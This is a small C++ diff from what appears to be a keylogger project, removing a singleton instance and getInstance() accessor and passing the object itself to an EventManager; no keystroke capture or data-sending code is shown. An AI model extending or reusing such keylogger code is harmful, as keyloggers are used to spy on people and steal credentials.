@@ -7,10 +7,7 @@
 /**
  * Keylogger implementation
  */
-
-Keylogger Keylogger::_instance = Keylogger();
-
-Keylogger::Keylogger() : _eventManager(*(new EventManager(_instance))), _hookHandler(*(new HookHandler(_eventManager))) {
+Keylogger::Keylogger() : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))) {
 }
 
 Keylogger::~Keylogger()
@@ -46,13 +43,6 @@ bool Keylogger::stop() {
  */
 bool Keylogger::kill() {
     return false;
-}
-
-/**
- * @return Keylogger&
- */
-Keylogger& Keylogger::getInstance() {
-    return _instance;
 }
 
 /**
